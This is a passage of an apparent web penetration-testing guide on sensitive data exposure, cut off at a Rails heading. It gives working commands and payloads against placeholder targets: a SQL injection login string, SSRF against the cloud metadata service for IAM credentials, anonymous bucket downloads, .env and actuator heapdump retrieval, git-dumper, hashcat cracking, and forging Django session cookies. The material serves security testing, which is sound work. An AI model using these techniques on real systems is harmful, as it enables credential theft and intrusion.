+<h3 id="1-api-over-fetching--mass-object-exposure">
+  1. API Over-Fetching / Mass Object Exposure
+  <a class="anchor" href="#1-api-over-fetching--mass-object-exposure">#</a>
+</h3>
+<p>APIs returning full internal object representations expose fields the UI never renders but the attacker can read directly.</p>
+<pre tabindex="0"><code>GET /api/v1/users/me HTTP/1.1
+Authorization: Bearer eyJhbGc...
+
+HTTP/1.1 200 OK
+{
+  &#34;id&#34;: 1042,
+  &#34;username&#34;: &#34;alice&#34;,
+  &#34;email&#34;: &#34;alice@example.com&#34;,
+  &#34;role&#34;: &#34;user&#34;,
+  &#34;password_hash&#34;: &#34;$2b$10$...&#34;,        ← should never be returned
+  &#34;api_key&#34;: &#34;sk_live_9xKp...&#34;,         ← internal key exposed
+  &#34;2fa_backup_codes&#34;: [&#34;839201&#34;, ...],  ← critical secret
+  &#34;stripe_customer_id&#34;: &#34;cus_Abc123&#34;
+}
+</code></pre><p><strong>Attack:</strong> Directly query the endpoint with any valid session token. No privilege escalation required — the data is simply returned by default.</p>
+<h3 id="2-verbose-error-messages--stack-trace--path-disclosure">
+  2. Verbose Error Messages — Stack Trace / Path Disclosure
+  <a class="anchor" href="#2-verbose-error-messages--stack-trace--path-disclosure">#</a>
+</h3>
+<p>Unhandled exceptions returned to the client reveal framework versions, internal file paths, database schemas, and connection strings.</p>
+<pre tabindex="0"><code>POST /api/login HTTP/1.1
+Content-Type: application/json
+{&#34;username&#34;: &#34;&#39; OR 1=1--&#34;, &#34;password&#34;: &#34;x&#34;}
+
+HTTP/1.1 500 Internal Server Error
+{
+  &#34;error&#34;: &#34;PG::SyntaxError: ERROR: syntax error at or near \&#34;OR\&#34;&#34;,
+  &#34;query&#34;: &#34;SELECT * FROM users WHERE username=&#39;&#39; OR 1=1--&#39; AND password=...&#34;,
+  &#34;file&#34;: &#34;/var/www/app/models/user.rb:42&#34;,
+  &#34;server&#34;: &#34;Rails 5.2.1 / PostgreSQL 9.6.3&#34;
+}
+</code></pre><h3 id="3-cloud-metadata-ssrf--credential-harvesting">
+  3. Cloud Metadata SSRF — Credential Harvesting
+  <a class="anchor" href="#3-cloud-metadata-ssrf--credential-harvesting">#</a>
+</h3>
+<p>If the application makes outbound HTTP requests with user-controlled URLs (SSRF), the cloud metadata endpoint leaks IAM credentials with production-level permissions.</p>
+<pre tabindex="0"><code># Trigger SSRF via a vulnerable URL-fetch parameter
+GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role HTTP/1.1
+
+HTTP/1.1 200 OK
+{
+  &#34;AccessKeyId&#34;: &#34;ASIA...&#34;,
+  &#34;SecretAccessKey&#34;: &#34;wJalrXUt...&#34;,
+  &#34;Token&#34;: &#34;AQoXnyc...&#34;,
+  &#34;Expiration&#34;: &#34;2026-03-23T18:00:00Z&#34;
+}
+# These credentials grant whatever IAM permissions prod-role has — often S3/RDS/SQS access
+</code></pre><h3 id="4-public-cloud-storage-enumeration">
+  4. Public Cloud Storage Enumeration
+  <a class="anchor" href="#4-public-cloud-storage-enumeration">#</a>
+</h3>
+<p>Misconfigured buckets expose entire data stores — backup archives, user uploads, internal logs — without authentication.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Enumerate publicly accessible S3 bucket</span>
+</span></span><span style="display:flex;"><span>aws s3 ls s3://target-company-backups --no-sign-request
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2024-11-01 03:12:44   2147483648 db_backup_prod_2024-11-01.sql.gz</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2025-01-15 08:44:11    104857600 user_exports_Q4_2024.csv</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2025-02-28 22:11:09      4096000 internal_api_keys.json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download directly</span>
+</span></span><span style="display:flex;"><span>aws s3 cp s3://target-company-backups/internal_api_keys.json . --no-sign-request
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># GCS equivalent</span>
+</span></span><span style="display:flex;"><span>gsutil ls gs://target-company-prod/ -u anonymous
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Azure Blob (public container)</span>
+</span></span><span style="display:flex;"><span>az storage blob list --account-name targetcompany --container-name backups --auth-mode anonymous
+</span></span></code></pre></div><h3 id="5-javascript-bundle-mining">
+  5. JavaScript Bundle Mining
+  <a class="anchor" href="#5-javascript-bundle-mining">#</a>
+</h3>
+<p>Modern SPA builds bundle all application code into browser-deliverable JS files. Secrets hardcoded during development ship directly to users.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Download and search all JS assets for secrets</span>
+</span></span><span style="display:flex;"><span>curl -s https://target.com | grep -oP <span style="color:#e6db74">&#39;src=&#34;([^&#34;]+\.js)&#34;&#39;</span> | <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  xargs -I<span style="color:#f92672">{}</span> curl -s https://target.com/<span style="color:#f92672">{}</span> | <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  grep -iE <span style="color:#e6db74">&#34;(api_key|apikey|secret|token|password|bearer|aws_access|private_key)\s*[=:]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Common findings:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># const API_KEY = &#34;AIzaSy...&#34;;               ← Google API key</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Authorization: `Bearer ${STATIC_TOKEN}`    ← Hardcoded Bearer token</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws_access_key_id: &#39;AKIA...&#39;              ← AWS key in config object</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check for exposed source maps (reveals original pre-minification source)</span>
+</span></span><span style="display:flex;"><span>curl -I https://target.com/static/js/main.abc123.js.map
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># HTTP 200 → download and reconstruct full source tree with source-map-cli</span>
+</span></span><span style="display:flex;"><span>npx source-map-explorer main.abc123.js --map main.abc123.js.map
+</span></span></code></pre></div><h3 id="6-cryptographic-failure-weak-hash-cracking">
+  6. Cryptographic Failure: Weak Hash Cracking
+  <a class="anchor" href="#6-cryptographic-failure-weak-hash-cracking">#</a>
+</h3>
+<p>Databases leaked or accessed via SQLi often contain password fields. Unsalted MD5/SHA-1 hashes are immediately reversible.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Identify hash type from a leaked database record</span>
+</span></span><span style="display:flex;"><span>hash-identifier <span style="color:#e6db74">&#34;5f4dcc3b5aa765d61d8327deb882cf99&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Result: MD5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Crack against rockyou wordlist</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> 5f4dcc3b5aa765d61d8327deb882cf99 /wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cracked: 5f4dcc3b5aa765d61d8327deb882cf99 → &#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SHA-1 unsalted</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">100</span> -a <span style="color:#ae81ff">0</span> &lt;SHA1_hash&gt; /wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># bcrypt (properly salted) — orders of magnitude slower, often infeasible</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> &lt;bcrypt_hash&gt; /wordlists/rockyou.txt
+</span></span></code></pre></div><h3 id="7-git-repository--backup-file-exposure">
+  7. Git Repository &amp; Backup File Exposure
+  <a class="anchor" href="#7-git-repository--backup-file-exposure">#</a>
+</h3>
+<p>Version control artifacts and editor backup files accidentally left on web servers expose full application source and embedded secrets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Discover exposed .git directory</span>
+</span></span><span style="display:flex;"><span>curl -s https://target.com/.git/HEAD
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: ref: refs/heads/main  ← .git is accessible</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reconstruct repository using git-dumper</span>
+</span></span><span style="display:flex;"><span>git-dumper https://target.com/.git/ ./recovered_repo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Search recovered source for secrets</span>
+</span></span><span style="display:flex;"><span>trufflehog filesystem ./recovered_repo --only-verified
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Common backup file patterns to check</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ext in .bak .old .backup .orig .swp ~; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  curl -si <span style="color:#e6db74">&#34;https://target.com/config.php</span><span style="color:#e6db74">${</span>ext<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | grep -E <span style="color:#e6db74">&#34;^HTTP|password|db_&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><h3 id="8-http-response-header-leakage">
+  8. HTTP Response Header Leakage
+  <a class="anchor" href="#8-http-response-header-leakage">#</a>
+</h3>
+<p>Response headers routinely disclose server software, framework versions, internal infrastructure details, and session handling weaknesses.</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: Apache/2.4.49 (Ubuntu)              ← exact version → CVE lookup
+X-Powered-By: PHP/7.4.3                     ← runtime version
+X-AspNet-Version: 4.0.30319                 ← .NET version
+X-Backend-Server: internal-app-01.corp      ← internal hostname
+Set-Cookie: session=abc123; Path=/          ← no HttpOnly, no Secure, no SameSite
+Via: 1.1 proxy-internal.corp (squid/4.6)   ← internal proxy details
+</code></pre><h2 id="bypasses--obfuscation">
+  Bypasses &amp; Obfuscation
+  <a class="anchor" href="#bypasses--obfuscation">#</a>
+</h2>
+<h3 id="1-accessing-hidden-api-fields-via-parameter-manipulation">
+  1. Accessing Hidden API Fields via Parameter Manipulation
+  <a class="anchor" href="#1-accessing-hidden-api-fields-via-parameter-manipulation">#</a>
+</h3>
+<p>Some APIs filter response fields based on query parameters or headers — adding or modifying these exposes suppressed data.</p>
+<pre tabindex="0"><code># Standard request — returns filtered response
+GET /api/v2/user/profile HTTP/1.1
+
+# Add field expansion parameters
+GET /api/v2/user/profile?fields=*  HTTP/1.1
+GET /api/v2/user/profile?expand=all HTTP/1.1
+GET /api/v2/user/profile?include=password_hash,api_key HTTP/1.1
+GET /api/v2/user/profile?debug=true HTTP/1.1
+</code></pre><h3 id="2-older-api-version-regression">
+  2. Older API Version Regression
+  <a class="anchor" href="#2-older-api-version-regression">#</a>
+</h3>
+<p>Newer API versions implement response filtering. Legacy endpoints remain active but return unredacted data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># v2 — properly filtered</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/api/v2/orders/1042 -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → {&#34;id&#34;:1042,&#34;total&#34;:99.99,&#34;status&#34;:&#34;shipped&#34;}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># v1 — original implementation, no filtering</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/api/v1/orders/1042 -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → {&#34;id&#34;:1042,&#34;total&#34;:99.99,&#34;status&#34;:&#34;shipped&#34;,&#34;card_last4&#34;:&#34;4242&#34;,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    &#34;card_token&#34;:&#34;tok_live_abc&#34;,&#34;billing_address&#34;:&#34;123 Main St&#34;,&#34;cvv_attempt&#34;:&#34;123&#34;}</span>
+</span></span></code></pre></div><h3 id="3-forced-error-state-triggering">
+  3. Forced Error State Triggering
+  <a class="anchor" href="#3-forced-error-state-triggering">#</a>
+</h3>
+<p>Intentionally malformed requests trigger verbose exceptions that expose internal details not visible in normal operation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Send invalid data types to provoke detailed error responses</span>
+</span></span><span style="display:flex;"><span>curl -X POST https://target.com/api/transfer <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;amount&#34;: &#34;not_a_number&#34;, &#34;to_account&#34;: null}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Typical vulnerable response:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># TypeError: Cannot read properties of null (reading &#39;account_number&#39;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   at /app/services/TransferService.js:88:23</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   at processTicksAndRejections (node:internal/process/task_queues:95:5)</span>
+</span></span></code></pre></div><h3 id="4-cache--cdn-poisoning-to-surface-private-responses">
+  4. Cache / CDN Poisoning to Surface Private Responses
+  <a class="anchor" href="#4-cache--cdn-poisoning-to-surface-private-responses">#</a>
+</h3>
+<p>If a CDN caches responses that should be private (missing <code>Cache-Control: no-store, private</code>), an attacker can retrieve another user&rsquo;s sensitive response from cache.</p>
+<pre tabindex="0"><code>GET /api/account/statement HTTP/1.1
+Host: target.com
+X-Forwarded-Host: target.com
+# If the CDN key doesn&#39;t include Authorization header → cached private response
+# served to next unauthenticated requester
+</code></pre><h2 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Payload / Action</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API Over-Fetching</td>
+<td><code>GET /api/v1/users/me</code> with low-priv token</td>
+<td>Response contains password hashes, tokens, or internal IDs</td>
+</tr>
+<tr>
+<td>Debug Endpoint Discovery</td>
+<td><code>GET /actuator/env</code>, <code>/debug/vars</code>, <code>/_ah/admin</code></td>
+<td>Internal config, env vars, or admin panel exposed</td>
+</tr>
+<tr>
+<td>Public Bucket Enumeration</td>
+<td><code>aws s3 ls s3://target-name --no-sign-request</code></td>
+<td>Bucket contents listed without credentials</td>
+</tr>
+<tr>
+<td>Cloud Metadata via SSRF</td>
+<td><code>GET /fetch?url=http://169.254.169.254/latest/meta-data/</code></td>
+<td>IAM role credentials returned in response</td>
+</tr>
+<tr>
+<td>JS Bundle Secret Mining</td>
+<td>`grep -iE &ldquo;api_key</td>
+<td>secret</td>
+</tr>
+<tr>
+<td>Source Map Exposure</td>
+<td><code>curl -I https://target.com/app.js.map</code></td>
+<td>HTTP 200 → full source reconstruction possible</td>
+</tr>
+<tr>
+<td>Git Directory Exposure</td>
+<td><code>curl https://target.com/.git/HEAD</code></td>
+<td><code>ref: refs/heads/main</code> → repository dumpable</td>
+</tr>
+<tr>
+<td>Verbose Error Triggering</td>
+<td>Send malformed JSON / SQL chars to API</td>
+<td>Stack trace, DB query, or file path returned</td>
+</tr>
+<tr>
+<td>Weak Hash Identification</td>
+<td>Extract hash from leaked DB; run <code>hash-identifier</code></td>
+<td>MD5/SHA-1 identified → cracked in seconds</td>
+</tr>
+<tr>
+<td>Header Information Leakage</td>
+<td>Inspect all response headers</td>
+<td><code>Server</code>, <code>X-Powered-By</code>, internal hostnames disclosed</td>
+</tr>
+<tr>
+<td>Cookie Security Flags</td>
+<td>Check <code>Set-Cookie</code> headers</td>
+<td>Missing <code>HttpOnly</code>, <code>Secure</code>, or <code>SameSite</code> flags</td>
+</tr>
+<tr>
+<td>Backup File Discovery</td>
+<td><code>curl https://target.com/config.php.bak</code></td>
+<td>Source code or credentials returned</td>
+</tr>
+<tr>
+<td>Old API Version Regression</td>
+<td>Compare <code>/v1/</code> vs <code>/v2/</code> same endpoint response</td>
+<td>v1 returns unredacted sensitive fields</td>
+</tr>
+<tr>
+<td>localStorage Secret Storage</td>
+<td>Open DevTools → Application → localStorage</td>
+<td>Tokens, user PII, or session data stored in plaintext</td>
+</tr>
+</tbody>
+</table>
+<h2 id="framework-specific-scenarios">
+  Framework-Specific Scenarios
+  <a class="anchor" href="#framework-specific-scenarios">#</a>
+</h2>
+<h3 id="spring-boot-java--actuator-exposure">
+  Spring Boot (Java) — Actuator Exposure
+  <a class="anchor" href="#spring-boot-java--actuator-exposure">#</a>
+</h3>
+<p>Spring Boot&rsquo;s Actuator endpoints expose application internals for monitoring. When left open in production without security config, they become a goldmine for attackers.</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Exposed Data</th>
+<th>Risk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/actuator/env</code></td>
+<td>All environment variables including DB passwords, API keys</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td><code>/actuator/heapdump</code></td>
+<td>Full JVM heap dump — contains in-memory secrets, sessions</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td><code>/actuator/mappings</code></td>
+<td>All registered URL routes and controllers</td>
+<td>High</td>
+</tr>
+<tr>
+<td><code>/actuator/beans</code></td>
+<td>Full Spring application context and bean definitions</td>
+<td>High</td>
+</tr>
+<tr>
+<td><code>/actuator/logfile</code></td>
+<td>Application log file contents</td>
+<td>High</td>
+</tr>
+<tr>
+<td><code>/actuator/httptrace</code></td>
+<td>Recent HTTP request/response history including headers</td>
+<td>High</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Discover and exploit exposed actuator</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/actuator/env | jq <span style="color:#e6db74">&#39;.propertySources[].properties | to_entries[]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  | select(.key | test(&#34;password|secret|key|token&#34;; &#34;i&#34;))&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Heap dump extraction — contains raw memory including decrypted secrets</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/actuator/heapdump -o heap.hprof
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Analyze with Eclipse Memory Analyzer (MAT) → search for String objects matching secret patterns</span>
+</span></span><span style="display:flex;"><span>strings heap.hprof | grep -iE <span style="color:#e6db74">&#34;password|secret|apikey|Bearer&#34;</span>
+</span></span></code></pre></div><h3 id="django-python--debug-mode--secret-key-exposure">
+  Django (Python) — Debug Mode &amp; Secret Key Exposure
+  <a class="anchor" href="#django-python--debug-mode--secret-key-exposure">#</a>
+</h3>
+<p>Django&rsquo;s <code>DEBUG=True</code> in production returns full exception pages with local variable state, settings values, and SQL queries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># settings.py misconfiguration — shipped to production</span>
+</span></span><span style="display:flex;"><span>DEBUG <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;django-insecure-hardcoded-key-abc123&#39;</span>  <span style="color:#75715e"># ← default key not rotated</span>
+</span></span><span style="display:flex;"><span>DATABASES <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;default&#39;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ENGINE&#39;</span>: <span style="color:#e6db74">&#39;django.db.backends.postgresql&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;PASSWORD&#39;</span>: <span style="color:#e6db74">&#39;prod_db_password_here&#39;</span>,  <span style="color:#75715e"># ← plaintext in source</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code># Trigger Django debug page — any 500-causing request
+GET /api/data?id=abc HTTP/1.1
+
+# Response: Full Django debug page containing:
+# - LOCAL VARS at every stack frame (including request.POST, session data)
+# - Full SQL query that failed
+# - Settings values (SECRET_KEY visible in INSTALLED_APPS context)
+# - Absolute file paths of every module
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If SECRET_KEY is exposed → forge any Django session cookie</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import django.core.signing as signing
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># With known SECRET_KEY, sign arbitrary session data
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(signing.dumps({&#39;_auth_user_id&#39;: &#39;1&#39;, &#39;_auth_user_backend&#39;: &#39;django.contrib.auth.backends.ModelBackend&#39;}, key=&#39;exposed-secret-key&#39;))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><h3 id="laravel-php--env-file--debug-bar-exposure">
+  Laravel (PHP) — .env File &amp; Debug Bar Exposure
+  <a class="anchor" href="#laravel-php--env-file--debug-bar-exposure">#</a>
+</h3>
+<p>Laravel stores all secrets in <code>.env</code>. Misconfigured deployments expose it directly; the Laravel Debugbar leaks request data in development mode left on in production.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Direct .env file access — extremely common misconfiguration</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/.env
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Common response:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># APP_KEY=base64:abc123...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DB_PASSWORD=SuperSecretProd123</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AWS_ACCESS_KEY_ID=AKIA...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AWS_SECRET_ACCESS_KEY=wJalr...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># STRIPE_SECRET=sk_live_...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># MAIL_PASSWORD=smtp_pass_here</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Laravel Debugbar active in production — leaks all request data</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/api/users -H <span style="color:#e6db74">&#34;Accept: application/json&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check response for X-Debug-Token header → fetch debug data</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/_debugbar/info?token<span style="color:#f92672">=</span>&lt;X-Debug-Token-value&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Returns: full SQL queries, session contents, request/response headers, app config</span>
+</span></span></code></pre></div><h3 id="expressjs--nodejs--environment-variable-leakage">
+  Express.js / Node.js — Environment Variable Leakage
+  <a class="anchor" href="#expressjs--nodejs--environment-variable-leakage">#</a>
+</h3>
+<p>Node.js applications commonly expose <code>process.env</code> in error handlers or debug routes, leaking the entire environment including secrets injected at deploy time.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable error handler — ships process.env to client
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">json</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stack</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">stack</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">env</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>  <span style="color:#75715e">// ← all environment variables including secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable debug route left active
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/debug&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">env</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">config</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./config&#39;</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uptime</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">uptime</span>()
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Trigger the debug endpoint</span>
+</span></span><span style="display:flex;"><span>curl https://target.com/debug | jq <span style="color:#e6db74">&#39;.env | to_entries[]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  | select(.key | test(&#34;KEY|SECRET|PASSWORD|TOKEN&#34;; &#34;i&#34;))&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Or force the error handler</span>
+</span></span><span style="display:flex;"><span>curl -X POST https://target.com/api/parse <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;INVALID_JSON_PAYLOAD&#39;</span>
+</span></span></code></pre></div><h3 id="ruby-on-rails--full-error-pages--credential-leakage">
+  Ruby on Rails — Full Error Pages &amp; Credential Leakage
